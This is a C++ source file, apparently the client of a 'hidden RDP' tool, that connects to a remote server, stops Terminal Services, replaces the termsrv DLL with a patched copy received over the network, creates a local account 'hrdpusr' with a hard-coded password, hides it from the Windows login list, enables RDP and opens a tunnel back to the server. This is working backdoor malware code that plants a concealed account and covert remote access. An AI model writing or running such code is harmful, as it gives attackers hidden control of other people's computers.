// hRDP_Client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include"net.h"
#include <iostream>
#include"RDP.h"
#include"Utils.h"
#include"Service.h"
#include"Log.h"

int main(int argc,char* argv[])
{
    char* ip;
    std::string i;
    if (argc < 2) {
        std::cout << "usage : hRDP_Client.exe ip_server \nmissing server ip argument ! type it manually : ";
        std::cin >> i;
        ip = (char*)i.c_str();
    }
    else {
        ip = argv[1];
    }
    PVOID oldw;
    if (!Wow64DisableWow64FsRedirection(&oldw)) {
        std::cout <<  GetLastError() << "\n";
        return -3;
    }

    if (!net::init()) { return -4; }
    char* buffer = (char*)malloc(MAXPACK);
    if (buffer == NULL) { ExitProcess(-5); }
    const char* magik = "\x66\x33\x64\x69\x30\x30\x36\x2F\x68\x52\x44\x50\x00";
    while (1) {
    start:
        std::cout << "Connecting...\n";
        if (!net::connect((char*)ip, 7050,&net::s)) { Sleep(5000); continue; }
        std::cout << "Connected!\n";
        //
        send(net::s, magik, 13, 0);
        std::wstring n = Utils::getName();
        if (n == L"") { return -1; }
        Log::SaveLog((wchar_t*)n.c_str());
        while (1) {
            if (Utils::isPatched()) { Log::SaveLog((wchar_t*)L"Already patched ! starting tunnel..."); }
            else
            { 
                //patch
                if (!Utils::IsProcessElevated()) { Log::SaveLog((wchar_t*)L"needs patching but not running elevated ,aborting..."); ExitProcess(0); }
                Service::serviceManage((wchar_t*)L"TermService", FALSE);
                Log::SaveLog((wchar_t*)L"Patching..."); 
                if (!Utils::TakeOwnership((LPTSTR)dllService)) { Log::SaveLog((wchar_t*)L"error taking ownership of service dll");  }
                if(!Utils::ChangePerm(dllService)){ Log::SaveLog((wchar_t*)L"error changing permission of service dll");  }
                if (CopyFile(dllService, L"C:\\ProgramData\\hrdp-termsrv.backup", TRUE)) {
                    if (!DeleteFile(dllService)) { Log::SaveLog((wchar_t*)L"error access service dll"); ExitProcess(-3); }
                }
                //check usr
                if (!RDP::doesUserExist(L"hrdpusr")) {
                    if(RDP::createUserAccount(L"hrdpusr", L"pwd123456789!!")){ RDP::AddUserToGroups((wchar_t*)L"hrdpusr"); }
                    

                }
                RDP::setRegistryValue(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", L"fDenyTSConnections",0);
                RDP::setRegistryValue(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist", L"hrdpusr", 0);
                if (!net::sendDll()) { closesocket(net::s); break; }
                //dll patched
                int p_sz;
                if (net::recvp(buffer, MAXPACK, &p_sz) == FALSE) { closesocket(net::s); break; }
                if (buffer[0] != 0x10) { std::cout << "unexpected response from server\n"; closesocket(net::s); break; }
                Service::serviceManage((wchar_t*)L"TermService", FALSE);
                if (RDP::saveDll(&buffer[1], p_sz) == FALSE) { Log::SaveLog((wchar_t*)L"Error Saving new dll !"); closesocket(net::s); break; }
                Service::serviceManage((wchar_t*)L"TermService", TRUE);
            
            }
            //tunnel
            if (!RDP::rdpTunnel()) {
                net::pktSend(net::s, nullptr, 0, 0x09);
                ExitProcess(0);
             }
             closesocket(net::s);
             break;
           
        }
    }


    
    
}
//hRDP project https://github.com/f3di006/hRDP f3di006@gmail.com